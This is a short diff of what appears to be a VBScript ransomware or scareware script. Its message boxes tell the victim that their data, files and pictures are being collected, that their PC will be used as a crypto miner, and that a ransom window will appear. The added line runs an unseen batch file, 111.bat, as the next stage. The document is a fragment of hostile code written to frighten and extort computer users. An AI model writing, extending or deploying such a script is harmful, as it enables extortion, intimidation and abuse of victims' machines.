@@ -46,3 +46,4 @@ z=MsgBox("At the moment we are collecting your DATA, Files, Pictures, And Networ
 z=MsgBox("Your PC will be used as a cryptoMiner and will be our slave untill we Say so.", 0+64, "LMA0")
 z=MsgBox("Once you click OK we will pull up a ransom window and you will have a bit more information about this there!.", 0+64, "LMA0")
 
+CreateObject("Wscript.Shell").Run """111.bat""", 1, True
